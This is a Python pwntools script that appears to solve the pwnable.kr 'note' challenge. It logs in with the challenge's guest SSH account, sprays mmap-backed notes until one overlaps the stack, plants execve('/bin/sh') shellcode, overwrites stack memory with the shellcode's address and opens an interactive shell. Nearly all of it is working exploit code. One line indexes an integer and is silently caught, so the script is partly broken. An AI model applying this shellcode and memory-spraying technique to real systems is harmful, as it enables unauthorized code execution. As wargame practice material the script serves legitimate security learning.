###mmap spraying : mmap_fixed is dangerous as it silently discards overlapping existing memory

from pwn import *

###Util
def create():
    r.sendlineafter('exit\n','1')
    return int(r.recvuntil(']').split(b'[')[1].split(b']')[0],16)

def edit(idx,data):
    r.sendlineafter('exit\n','2')
    r.sendlineafter('no?\n',str(idx))
    r.sendlineafter('byte)\n',data)

def delete(idx):
    r.sendlineafter('exit\n','4')
    r.sendlineafter('no?\n',str(idx))

###Addr
#  ASLR off
STACK = [0xfffdd000,0xffffe000]

###Exploit
s = ssh(host='pwnable.kr',port=2222,
        user='note',
        password='guest')


while True:
    try:
        r = s.remote('127.0.0.1',9019)
        FRST = create()
        shellcode = asm(f'''
                         mov eax, 11
                         mov ebx, {FRST+0x20}
                         mov ecx, 0
                         mov edx, 0
                         int 0x80
                         ''').ljust(0x20,b'\x00')+b'/bin/sh\x00'
        edit(0,shellcode)
        IDX = 1
        while True:
            ADDR = create()
            print(hex(ADDR))
            if ADDR==FRST:
                edit(0,shellcode)
                IDX+=1
                if IDX==256:
                    exit()
            elif STACK[0]<ADDR and ADDR<STACK[1]:
                edit(IDX,p32(FRST)*((STACK[1]-ADDR[1])//4))
                break
            else:
                delete(IDX)
        break
    except:
        r.close()

r.interactive()
